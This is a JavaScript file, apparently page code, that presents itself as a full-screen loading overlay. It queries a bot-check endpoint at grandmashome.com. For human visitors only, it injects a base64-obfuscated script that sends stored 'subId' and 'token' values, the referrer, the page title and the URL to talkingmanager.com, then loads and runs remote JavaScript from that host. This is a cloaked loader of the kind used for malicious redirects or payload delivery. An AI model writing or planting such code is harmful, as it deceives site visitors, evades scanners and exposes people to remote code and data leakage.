const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
window.addEventListener('DOMContentLoaded', () => {
    createLoader();
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfWTFQWFhIeUdHUVBENDMzcic7CiAgICBpZiAoIXdpbmRvdy5fWTFQWFhIeUdHUVBENDMzcikgewogICAgICAgIHdpbmRvdy5fWTFQWFhIeUdHUVBENDMzciA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vZnduZjZmM3AnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfSkRQVEdLNm15eXI3U2JGSCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX0pEUFRHSzZteXlyN1NiRkggIT09ICd1bmRlZmluZWQnICYmIF9KRFBUR0s2bXl5cjdTYkZIICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9McGRnMmZQYjROVGNIWXpKID0gSlNPTi5wYXJzZShfSkRQVEdLNm15eXI3U2JGSCk7CiAgICAgICAgdmFyIF9UN0h5REZOZllYSnBCOGJaID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX0xwZGcyZlBiNE5UY0hZekouY3JlYXRlZF9hdCArIHdpbmRvdy5fWTFQWFhIeUdHUVBENDMzci50dGwgPCBfVDdIeURGTmZZWEpwQjhiWikgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX1ZmOWc4YjhoWndQTjZHbU0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfaGZwdjNyOTUzakdUNGgzUSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9ScDg2NHZreU54NVQ4VlJTID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfUnA4NjR2a3lOeDVUOFZSUyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfUnA4NjR2a3lOeDVUOFZSUyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9ScDg2NHZreU54NVQ4VlJTICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9ScDg2NHZreU54NVQ4VlJTICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfUnA4NjR2a3lOeDVUOFZSUyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfUnA4NjR2a3lOeDVUOFZSUyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX1kxUFhYSHlHR1FQRDQzM3IuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX1ZmOWc4YjhoWndQTjZHbU0gIT09ICd1bmRlZmluZWQnICYmIF9WZjlnOGI4aFp3UE42R21NICYmIHdpbmRvdy5fWTFQWFhIeUdHUVBENDMzci51bmlxdWUpIHsKICAgICAgICBfUnA4NjR2a3lOeDVUOFZSUyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9WZjlnOGI4aFp3UE42R21NKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX2hmcHYzcjk1M2pHVDRoM1EgIT09ICd1bmRlZmluZWQnICYmIF9oZnB2M3I5NTNqR1Q0aDNRICYmIHdpbmRvdy5fWTFQWFhIeUdHUVBENDMzci51bmlxdWUpIHsKICAgICAgICBfUnA4NjR2a3lOeDVUOFZSUyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX2hmcHYzcjk1M2pHVDRoM1EpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9ScDg2NHZreU54NVQ4VlJTICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fWTFQWFhIeUdHUVBENDMzci5SX1BBVEggKyBfUnA4NjR2a3lOeDVUOFZSUzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
             document.querySelector("head").appendChild(script);
        }
        toggleLoad();
        
    })
})
